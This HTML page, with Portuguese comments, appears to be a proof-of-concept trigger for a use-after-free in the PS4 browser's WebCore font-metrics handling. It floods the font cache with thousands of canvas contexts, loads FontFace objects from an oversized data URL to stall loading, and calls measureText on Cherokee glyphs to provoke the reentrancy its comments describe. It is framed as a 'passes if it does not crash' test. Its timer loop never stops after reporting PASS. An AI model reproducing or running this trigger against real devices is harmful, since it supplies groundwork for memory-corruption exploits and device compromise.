<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>PS4 Font Metrics UAF Test - Option A</title>
</head>
<body>
    <p>This test passes if it does not crash.</p>
    <div id="status">Testing...</div>

    <script>
    
    function runTestOptionA() {
        // 1. Criar instâncias dummy de canvas para inflar a cache de fontes
        const dummies = [];
        for (let i = 0; i < 3500; i++) {
            const dummy = document.createElement('canvas');
            dummy.width = 1;
            dummy.height = 1;
            const ctx = dummy.getContext('2d');
            ctx.font = '10px "dummy' + i + '"';
            dummies.push(ctx);
        }

        // Data URL grande (>= 1MB) para forçar o atraso no carregamento da fonte
        const pendingFontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
        const keepAlive = [];

        // 2. Processamento assíncrono em fatias
        let attempt = 0;

        function step() {
            if (attempt >= 2) {
                document.getElementById('status').innerText = 'PASS if no crash';
                
            }

            const metricsDonor = new FontFace('metricsDonor' + attempt, pendingFontURL);
            const measured = new FontFace('measured' + attempt, pendingFontURL, { unicodeRange: 'U+13A0-13FF' });

            document.fonts.add(metricsDonor);
            document.fonts.add(measured);

            const canvas = document.createElement('canvas');
            canvas.width = 64;
            canvas.height = 64;
            const context = canvas.getContext('2d');

            context.font = '10px metricsDonor' + attempt + ', measured' + attempt;
            keepAlive.push(metricsDonor, measured, context);

            // Medição que dispara a reentrância no WebCore
            context.measureText('\u13A0\u13A2\u13A4');

            attempt++;
            setTimeout(step, 0);
        }

        setTimeout(step, 0);
    }

    window.onload = function() {
        setTimeout(runTestOptionA, 0);
    };
    </script>
</body>
</html>
